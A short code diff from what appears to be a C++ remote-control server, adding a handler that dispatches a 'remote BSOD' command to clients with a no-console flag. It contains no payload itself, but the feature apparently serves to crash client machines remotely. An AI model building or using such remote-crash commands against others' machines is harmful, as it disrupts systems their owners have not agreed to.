@@ -599,6 +599,10 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
         break;
     // no additional user input required 
     case RemoteAction::kRemoteBSOD:
+        cmdInfo.flags = PACKET_IS_A_COMMAND | NO_CONSOLE;
+        std::cout << "doing a bsod!" << std::endl;
+        performed = true;
+        break;
     case RemoteAction::kPingClient:
         performed = true;
         break;
